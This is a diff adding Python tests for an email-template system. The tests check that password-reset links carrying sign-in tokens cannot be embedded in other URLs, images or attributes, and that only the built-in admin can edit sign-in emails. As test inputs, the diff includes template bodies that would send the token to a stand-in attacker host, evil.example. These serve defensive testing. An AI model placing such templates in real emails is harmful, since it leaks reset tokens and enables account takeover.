@@ -18,15 +18,15 @@ from app.messaging.catalog import BY_KEY, CATALOGUE, MESSAGE_PLACEHOLDERS, Place
 from app.messaging.messages import (audience_query, claim_due, deliver, dispatch_due, recipient_count, render_for,
                                     send_admin_message, send_now, unschedule)
 from app.messaging.render import (Value, compose, fill_html, fill_text, overridden, placeholders_in, problems,
-                                  sample_values)
+                                  sample_values, secret_fits)
 from app.messaging.values import digest_values
 from app.models import (AdminMessage, AdminMessageDelivery, AdminMessagePick, EmailTemplate, MemberSubscription,
                         Notification, Offer, Post, Role, RoleGrant, Site, SiteDomain, User, utcnow)
 from app.shared.community import invite_with_email
 from app.storefront import clear_domain_cache, home_storefront
 from app.utils import set_setting
-from tests.factories import (INSTANCE_SETTINGS, grant_permission, grant_permissions, make_community, make_instance,
-                             make_user)
+from tests.factories import (INSTANCE_SETTINGS, grant_permission, grant_permissions, make_admin, make_community,
+                             make_instance, make_user)
 
 DEFAULT_HOST = 'test.piefed.local'
 
@@ -198,6 +198,69 @@ class TestPlaceholders:
 
     def test_a_url_with_no_value_is_left(self):
         assert fill_html('<p>{url}</p>', {}, {'url': 'url'}) == '<p>{url}</p>'
+
+
+SECRET = Placeholder('reset_url', 'a reset link', 'https://piefed.example/r/abc', 'secret', True)
+TOKEN_LINK = 'https://piefed.example/auth/reset_password/TOKEN'
+
+
+class TestSecretLinks:
+    """D23: a link carrying a sign-in token only ever stands as a link of its own, so an editor cannot send it to
+    their own server."""
+
+    @pytest.mark.parametrize('body', [
+        '{reset_url}', 'Open {reset_url}', 'Open {reset_url}.', 'Open {reset_url}, now', '[Reset it]({reset_url})',
+        'Line one\n{reset_url}\nLine three', 'Open {reset_url}! now',
+    ])
+    def test_where_it_may_stand(self, body):
+        assert problems((SECRET,), 'Reset', body) == []
+
+    @pytest.mark.parametrize('body', [
+        '![x]({reset_url})', '[x](https://evil.example/?u={reset_url})', 'https://evil.example/{reset_url}',
+        '<img src="{reset_url}">', '({reset_url})', '{reset_url}x', 'x{reset_url}', '[x]({reset_url} "t")',
+        '{reset_url}.x', '{reset_url}](x)', '](x){reset_url}',
+    ])
+    def test_where_it_may_not(self, body):
+        assert any('carries a sign-in token, so it can only be a link of its own' in problem
+                   for problem in problems((SECRET,), 'Reset', body))
+
+    def test_never_in_the_subject(self):
+        assert '{reset_url} carries a sign-in token, so it cannot be in the subject' in problems(
+            (SECRET,), 'Go {reset_url}', '{reset_url}')
+
+    def test_a_link_without_its_opening_bracket(self):
+        assert not secret_fits('x]({reset_url})', 3, 14)
+
+    def test_text_drops_it_anywhere_else(self):
+        values = {'reset_url': Value(TOKEN_LINK)}
+        kinds = {'reset_url': 'secret'}
+        assert fill_text('a {reset_url} b', values, kinds) == f'a {TOKEN_LINK} b'
+        assert fill_text('https://evil.example/?{reset_url}', values, kinds) == 'https://evil.example/?'
+        assert fill_text('[x]({reset_url})', values, kinds) == f'[x]({TOKEN_LINK})'
+
+    def test_html_puts_it_only_as_a_links_whole_href(self, env):
+        values, kinds = {'reset_url': Value(TOKEN_LINK)}, {'reset_url': 'secret'}
+        rendered = ('<p><a href="{reset_url}">a</a> <a href="%7Breset_url%7D">b</a> <img src="{reset_url}"> '
+                    '<a href="https://evil.example/?{reset_url}">c</a> <img src="%7Breset_url%7D"> '
+                    '<a title="{reset_url}" href="x">d</a> {reset_url}</p>')
+        out = fill_html(rendered, values, kinds)
+        assert out.count('TOKEN') == 4
+        assert f'<a href="{TOKEN_LINK}">a</a>' in out and f'<a href="{TOKEN_LINK}">b</a>' in out
+        assert '<img src="">' in out and '<a href="https://evil.example/?">c</a>' in out
+        assert '<a title="" href="x">d</a>' in out and f'<a href="{TOKEN_LINK}">{TOKEN_LINK}</a></p>' in out
+
+    def test_html_leaves_a_secret_with_no_value(self, env):
+        assert fill_html('<a href="{reset_url}">a</a>', {}, {'reset_url': 'secret'}) == '<a href="{reset_url}">a</a>'
+
+    def test_a_row_written_some_other_way_leaks_nothing(self, env):
+        """The checks at saving are not all there is: a row that skipped them is filled the same way."""
+        with home_storefront(env.admin):
+            mail = compose('{reset_url}', '![x](https://evil.example/{reset_url}) [y](https://evil.example/?{reset_url})',
+                           (SECRET,), {'reset_url': Value(TOKEN_LINK)})
+        assert 'TOKEN' not in mail.subject + mail.text_body + mail.html_body
+
+    def test_the_sign_in_emails_are_admin_only(self):
+        assert {entry.key for entry in CATALOGUE if entry.admin_only} == {'password_reset', 'verify_email'}
 
 
 class TestCompose:
@@ -836,7 +899,7 @@ class TestMessageActions:
 class TestEditingABuiltIn:
     @pytest.fixture(autouse=True)
     def may_edit(self, env):
-        grant_permission(env.admin, 'edit email templates')
+        make_admin(env.admin)   # the sign-in emails are the built-in Admin's (D23)
 
     def test_the_page_says_when_and_offers_its_placeholders(self, env):
         body = text_of(env.client.get('/admin/messaging/email/subscription_expiring'))
@@ -887,6 +950,25 @@ class TestEditingABuiltIn:
         override('welcome', 'W', 'w')
         assert env.client.post('/admin/messaging/email/welcome/reset').status_code == 400
         assert db.session.get(EmailTemplate, 'welcome') is not None
+
+    def test_the_sign_in_emails_need_the_built_in_admin(self, env):
+        editor = member(env, 'editor')
+        grant_permission(editor, 'edit email templates')
+        client = env.app.test_client()
+        login(client, editor)
+        assert client.get('/admin/messaging/email/password_reset').status_code == 403
+        assert client.get('/admin/messaging/email/verify_email').status_code == 403
+        assert post(env, '/admin/messaging/email/password_reset/reset', client=client).status_code == 403
+        assert client.get('/admin/messaging/email/welcome').status_code == 200
+        grant_permission(editor, 'send newsletter')
+        body = text_of(client.get('/admin/messaging'))
+        assert '/admin/messaging/email/welcome' in body and '/admin/messaging/email/password_reset' not in body
+        assert 'Admin only' in body
+
+    def test_a_token_link_inside_another_url_is_refused(self, env):
+        response = post(env, '/admin/messaging/email/password_reset', subject='Reset',
+                        body='![x](https://evil.example/{reset_url})', save='y')
+        assert 'carries a sign-in token' in text_of(response) and EmailTemplate.query.count() == 0
 
     def test_send_newsletter_alone_is_not_enough(self, env):
         holder = member(env, 'sender')
